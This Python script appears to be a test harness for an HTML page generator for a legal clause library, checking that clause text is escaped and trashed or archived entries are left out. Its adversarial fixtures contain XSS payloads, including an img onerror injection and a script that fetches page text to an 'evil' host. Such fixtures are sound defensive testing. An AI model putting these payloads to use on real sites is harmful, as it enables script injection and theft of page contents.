# Faithful re-implementation of CLPlatform.CLHtml + CLCatalogue.CLBrowse string building
def CLHtml(v):
    v = v.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")
    return v

def CLBrowse(entries, stamp="2026-09-19T11:02:33"):
    html  = "<!doctype html><html lang='en'><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'><meta http-equiv='Content-Security-Policy' content=\"default-src 'none';style-src 'unsafe-inline';script-src 'unsafe-inline';connect-src 'none';base-uri 'none';form-action 'none'\"><title>Clause Library</title>"
    html += "<style>body{font:16px/1.55 system-ui}</style><main><h1>Clause Library</h1>"
    html += "<p>Find wording you have kept. This browsing copy was generated " + CLHtml(stamp) + ". Edit and organise in Word; reopen Browse to refresh this copy.</p><p class='meta'>Private notes and source references are excluded. Clause wording may still be confidential.</p><label for='q'>Search clauses and comments</label><input id='q' type='search' placeholder='Try a topic, phrase or tag'><p id='status' role='status'></p>"
    for e in entries:
        if e.get("state") == "Active":
            html += ("<article><h2>" + CLHtml(e.get("title","")) + "</h2><p class='meta'>"
                     + CLHtml(e.get("kind","") + " | " + e.get("topic","") + " | " + e.get("tags",""))
                     + "</p><p>" + CLHtml(e.get("applicability","")) + "</p><pre>"
                     + CLHtml(e.get("plain","")) + "</pre><button type='button'>Copy plain text</button></article>")
    html += "<script>const q=document.getElementById('q'),s=document.getElementById('status'),items=[...document.querySelectorAll('article')];q.oninput=()=>{const words=q.value.toLowerCase().split(/\\s+/).filter(Boolean);let n=0;for(const a of items){a.hidden=!words.every(w=>a.textContent.toLowerCase().includes(w));if(!a.hidden)n++;}s.textContent=n+' items';};for(const a of items)a.querySelector('button').onclick=async()=>{try{await navigator.clipboard.writeText(a.querySelector('pre').textContent);s.textContent='Copied. Check the wording in your contract.';}catch{s.textContent='Select the wording and use Ctrl+C. Your browser did not allow automatic copying.';const r=document.createRange();r.selectNodeContents(a.querySelector('pre'));const z=getSelection();z.removeAllRanges();z.addRange(r);}};q.oninput();</script></main></html>"
    return html

entries = [
  {"state":"Active","kind":"Clause","title":"Benign indemnity","topic":"Liability","tags":"indemnity",
   "applicability":"Use in supply agreements","plain":"The Supplier shall indemnify the Customer."},
  # adversarial: clause text that itself contains markup
  {"state":"Active","kind":"Clause","title":"</pre><script>alert('xss')</script>","topic":"a<b","tags":"x\"y",
   "applicability":"</p><img src=x onerror=alert(1)>",
   "plain":"</pre></article><script>fetch('http://evil/'+document.body.innerText)</script><pre>"},
  # adversarial: content that breaks out of the JS string / template
  {"state":"Active","kind":"Clause","title":"Backtick ` and ${x} and 'single'","topic":"","tags":"",
   "applicability":"","plain":"</script><script>alert(2)</script>"},
  {"state":"Trash","kind":"Clause","title":"SHOULD NOT APPEAR - trashed","topic":"","tags":"","applicability":"","plain":"secret trashed wording"},
  {"state":"Archived","kind":"Clause","title":"SHOULD NOT APPEAR - archived","topic":"","tags":"","applicability":"","plain":"secret archived wording"},
]
open("Browse.html","w",encoding="utf-8").write(CLBrowse(entries))
print("wrote Browse.html", len(CLBrowse(entries)), "chars")
